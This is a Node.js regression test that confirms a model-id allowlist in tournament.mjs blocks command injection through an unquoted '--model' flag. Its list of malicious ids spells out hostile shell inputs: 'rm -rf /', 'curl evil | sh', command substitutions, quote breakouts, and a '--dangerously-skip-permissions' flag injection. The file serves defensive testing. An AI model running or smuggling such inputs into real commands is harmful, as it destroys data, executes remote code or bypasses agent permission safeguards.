// Security regression test for audit #5, finding #3 — argument/command injection via an
// UNQUOTED model flag in tournament.mjs's dispatch/runnerCmd region.
//
// node tournament-flag-injection.test.mjs   (no deps; exits 0 on pass, 1 on fail)
//
// HOW IT PROVES THE FIX (drift-proof, exercises the SHIPPED code):
//   tournament.mjs has top-level `return`s, so it cannot be imported. We EXTRACT the exact
//   SAFE_MODEL_ID regex literal and validModelId() SOURCE from the shipped file and eval them — no
//   copy. We then reproduce dispatch()'s real local-path flag construction: the guard (reject +
//   fail-closed when a.model is unsafe) followed by `--model ${a.model}`. The bug: a local model id
//   reaches the shell as an unquoted flag token (the local path accepts ids verbatim), so a hostile
//   id like `x; rm -rf /` or `--dangerously-skip-permissions` flowed unescaped into the runner
//   command. The fix validates a.model against a strict allowlist (the SAFE_MODEL_ID regex —
//   metachar-free charset, and a non-dash leading char so a dash-leading id can't pose as a CLI
//   option) BEFORE any interpolation and fails closed (drops the attempt → no flag) on a non-match.
//   The regex is extracted from the shipped source, so this stays in sync. We assert malicious ids
//   are rejected and
//   never produce an interpolated flag, AND that benign ids (id-shaped strings using only the
//   allowed charset, incl. dots/dashes/underscores) still build the expected flag.

import { readFileSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { dirname, join } from 'node:path'

const HERE = dirname(fileURLToPath(import.meta.url))
const SRC = readFileSync(join(HERE, 'tournament.mjs'), 'utf8')

// ---- extract the REAL SAFE_MODEL_ID regex + validModelId() from the shipped file ----
function extractFn(src, name) {
  const sig = `function ${name}(`
  const start = src.indexOf(sig)
  if (start < 0) throw new Error(`could not find ${sig} in tournament.mjs`)
  let i = src.indexOf('{', start), depth = 0
  for (; i < src.length; i++) {
    if (src[i] === '{') depth++
    else if (src[i] === '}') { depth--; if (depth === 0) return src.slice(start, i + 1) }
  }
  throw new Error(`unbalanced braces extracting ${name}`)
}
function extractConstLine(src, name) {
  const m = src.match(new RegExp(`^const ${name} = .*$`, 'm'))
  if (!m) throw new Error(`could not find const ${name} in tournament.mjs`)
  return m[0]
}

// Eval the shipped const + function as statements, then hand back the function reference.
// eslint-disable-next-line no-eval
const validModelId = (0, eval)(`${extractConstLine(SRC, 'SAFE_MODEL_ID')}; ${extractFn(SRC, 'validModelId')}; validModelId`)

// Reproduce dispatch()'s REAL local-path flag wiring: the fail-closed guard, then the (post-guard)
// flag construction copied verbatim from the shipped local branch (`--model ${a.model}`). Returns
// the interpolated flag, or null when the attempt is dropped (fail closed → no flag ever built).
function localFlagFor(model) {
  if (!validModelId(model)) return null        // dispatch() logs + `return null` (attempt dropped)
  return `--model ${model}`                     // shipped local-path flag construction
}

let failed = 0
const check = (name, cond) => { if (cond) console.log(`ok   - ${name}`); else { console.error(`FAIL - ${name}`); failed++ } }

console.log('== tournament.mjs model-flag injection (audit #5 finding #3) ==')

// (a) Malicious local ids must be REJECTED and never produce an interpolated flag (fail closed).
const MALICIOUS = [
  'x; rm -rf /',                       // command chaining
  '--dangerously-skip-permissions',    // flag injection (leading dash)
  'foo; curl evil | sh',               // pipe to shell
  'a`touch PWNED`',                    // backtick command sub
  'b$(touch PWNED)',                   // $() command sub
  'c && rm -rf .',                     // && chaining
  'd e',                               // embedded space -> extra arg token
  "f'g",                               // quote breakout
]
for (const m of MALICIOUS) {
  check(`(a) malicious id rejected (fail closed, no flag built)`, validModelId(m) === false && localFlagFor(m) === null)
}

// (b) Normal/legitimate ids are ACCEPTED and build the expected single-token flag. These are
// id-SHAPED strings that exercise every allowed character class (letters, digits, dot, dash,
// underscore) — no raw product identifiers are hardcoded here.
const BENIGN = ['plainalpha', 'mixed2.5-edition-7x', 'with_underscore', 'a.b-c_1', 'Cap1.2.3-rev']
for (const m of BENIGN) {
  check(`(b) benign id accepted and builds the expected flag`, validModelId(m) === true && localFlagFor(m) === `--model ${m}`)
}

// (b') non-string / empty inputs also fail closed.
check(`(b') empty string rejected`, validModelId('') === false && localFlagFor('') === null)
check(`(b') undefined rejected`, validModelId(undefined) === false && localFlagFor(undefined) === null)

console.log(failed ? `\n${failed} check(s) FAILED` : '\nAll checks passed')
process.exit(failed ? 1 : 0)
